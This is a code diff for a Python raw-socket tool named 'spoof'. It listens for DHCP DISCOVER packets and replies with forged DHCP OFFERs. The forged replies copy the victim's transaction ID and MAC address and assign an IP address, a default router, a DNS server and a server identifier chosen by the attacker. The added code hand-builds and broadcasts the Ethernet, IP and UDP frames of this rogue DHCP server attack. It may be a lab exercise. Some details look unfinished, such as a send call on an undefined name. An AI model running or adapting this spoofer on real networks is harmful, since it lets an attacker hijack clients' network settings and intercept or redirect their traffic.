@@ -2,7 +2,7 @@ import socket
 import struct
 import sys
 
-from util.format import bytesToMac
+from util.util import bytesToMac, computeChecksum
 
 ETH_P_ALL = 0x0003
 ETH_P_IP = 0x0800
@@ -90,12 +90,16 @@ def decodeDHCP(udp_data: bytes) -> (dict, bytes):
 # ------------------------------------------------------------------------
 
 
-def getSpoofedDHCPOffer() -> bytes:
+def getSpoofedDHCPOffer(data) -> bytes:
     def getZeroList(s: int):
         l = []
         for si in range(s):
             l.append(0x0)
         return l
+
+    client_mac = data['eth'][1]
+    dhcpXid = data['dhcp']['xid']
+    dhcpFlags = data['dhcp']['flags']
 
     offer = struct.pack(
         '!BBBBIHHIIII16s64s128sI',
@@ -103,24 +107,94 @@ def getSpoofedDHCPOffer() -> bytes:
         DHCPOFFER,  # type
         6,  # hlen | only one MAC address
         0x00,  # hops
-        0x3903F326,  # xid
+        dhcpXid,  # xid
         0x0000,  # secs
-        0x0000,  # flags
-        struct.unpack('!I', socket.inet_aton('192.168.1.123'))[0],  # ciaddr
-        struct.unpack('!I', socket.inet_aton('0.0.0.0'))[0],  # yiaddr
-        struct.unpack('!I', socket.inet_aton('0.0.0.0'))[0],  # siaddr
-        struct.unpack('!I', socket.inet_aton('0.0.0.0'))[0],  # giaddr
-        bytearray(getZeroList(16)),  # chaddr
+        dhcpFlags,  # flags
+        struct.unpack('!I', socket.inet_aton('0.0.0.0'))[0],    # ciaddr
+        struct.unpack('!I', socket.inet_aton('10.0.0.10'))[0],  # yiaddr
+        struct.unpack('!I', socket.inet_aton('10.0.0.11'))[0],  # siaddr
+        struct.unpack('!I', socket.inet_aton('0.0.0.0'))[0],    # giaddr
+        client_mac,  # chaddr
         bytearray(getZeroList(64)),  # sname
         bytearray(getZeroList(128)),  # file
         0x63825363,
     )
 
-    return offer
+    offer_opts = struct.pack(
+        '!BBB BB4s BB4s BB4s BBI BB4s B',
+        53, 1, DHCPOFFER,  # message type
+        1, 4, socket.inet_aton('255.255.255.0'),  # subnet mask opt
+        3, 4, socket.inet_aton('1.1.1.1'),  # router ip
+        6, 4, socket.inet_aton('8.8.8.8'),  # DNS server
+        51, 4, 3600,  # lease time (seconds)
+        54, 4, socket.inet_aton('10.0.0.11'),
+        255,
+    )
+    print('offer opts', offer_opts)
+    return offer+offer_opts
 
 
-def sendDHCPOfferSpoofed() -> None:
-    offer = getSpoofedDHCPOffer()
+def sendDHCPOfferSpoofed(sock: socket, data) -> None:
+    offer = getSpoofedDHCPOffer(data)
+
+    dest_mac = data['eth'][1]
+    src_mac = data['eth'][0]
+    eht_h = struct.pack(
+        '!6s6sH',
+        dest_mac,
+        b'\x00\x00\x00\xaa\x00\x03',
+        ETH_P_IP,
+    )
+
+    ipVersion = 4
+    ipHlen = 5
+    ipTOS = 0
+    ipTotLen = 0
+    ipID = 1
+    ipFrag = 0
+    ipTTL = 255
+    ipProto = socket.IPPROTO_UDP
+    ipChecksum = 0
+    ipSaddr = socket.inet_aton('10.0.0.11')
+    ipDaddr = socket.inet_aton('255.255.255.255')
+    ipHlenVersion = (ipVersion << 4) + ipHlen
+
+    ip_h = struct.pack(
+        '!BBHHHBBH4s4s',
+        ipHlenVersion,
+        ipTOS,
+        ipTotLen,
+        ipID,
+        ipFrag,
+        ipTTL,
+        ipProto,
+        ipChecksum,
+        ipSaddr,
+        ipDaddr
+    )
+
+    udpSport = 67
+    udpDport = 68
+    udpLen = struct.calcsize('!HHHH')+len(offer)
+    udpChecksum = 0
+    udp_h = struct.pack('!HHHH', udpSport, udpDport, udpLen, udpChecksum)
+
+    pseudo_h = struct.pack(
+        '!4s4sBBH',
+        ipSaddr,
+        ipDaddr,
+        0,
+        socket.IPPROTO_UDP,
+        udpLen,
+    )
+
+    # * get the checksum with pseudo header + udp header + dhcp offer packet
+    udpChecksum = computeChecksum(pseudo_h+udp_h+offer)
+    udp_h = struct.pack('!HHHH', udpSport, udpDport, udpLen, udpChecksum)
+
+    npacket = eht_h+ip_h+udp_h+offer
+
+    s.send(npacket)
 
     return None
 
@@ -156,17 +230,32 @@ def spoof(s: socket) -> None:
                 (psrc, pdst, plen, udp_data) = decodeUDP(ip_data)
                 print('\nUDP p_src:', psrc)
                 print('UDP p_dst:', pdst)
+                print('UDP len:', plen)
                 # print('UDP data:', udp_data)
 
                 if isDHCP(psrc, pdst):
                     (dhcp, dhcp_data) = decodeDHCP(udp_data)
                     print('\nDHCP:', dhcp)
+                    print('DHCP xid', hex(dhcp['xid']))
                     # print('DHCP data:', dhcp_data)
+
+                    dhcpToSpoof = {
+                        'eth': eth,
+                        'ip': {
+                            'ip_s': ip_s,
+                            'ip_d': ip_d,
+                        },
+                        'udp': {
+                            'psrc': psrc,
+                            'pdst': pdst,
+                        },
+                        'dhcp': dhcp,
+                    }
 
                     htype = dhcp['htype']
                     if htype == DHCPDISCOVER:
                         print('DHCP discover')
-                        sendDHCPOfferSpoofed()
+                        sendDHCPOfferSpoofed(s, dhcpToSpoof)
                     elif htype == DHCPREQUEST:
                         print('DHCP request')
                         sendDHCPAckSpoofed()
